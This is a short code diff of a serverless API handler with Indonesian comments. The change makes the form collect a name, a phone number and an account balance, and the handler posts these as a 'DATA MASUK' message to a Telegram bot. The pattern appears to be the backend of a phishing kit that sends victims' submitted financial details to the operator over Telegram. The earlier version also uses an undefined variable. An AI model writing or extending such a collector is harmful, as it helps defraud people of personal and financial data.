@@ -7,10 +7,10 @@ export default async function handler(req, res) {
   }
 
   try {
-    const { provinsi, nama, hp } = req.body;
+    const { nama, nohp, saldo } = req.body;
 
     // validasi
-    if (!provinsi || !nama || !hp) {
+    if (!nama || !nohp || !saldo) {
       return res.status(400).json({ message: "Data tidak lengkap" });
     }
 
@@ -20,9 +20,9 @@ export default async function handler(req, res) {
     // format pesan
     const text =
       "DATA MASUK\n\n" +
-      "Provinsi: " + provinsi + "\n" +
-      "Nama: " + nama + "\n" +
-      "No HP: +62" + nohp;
+      "nama: " + nama + "\n" +
+      "nohp: +62 " + nohp + "\n" +
+      "saldo: Rp." + saldo;
 
     // kirim ke Telegram
     await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
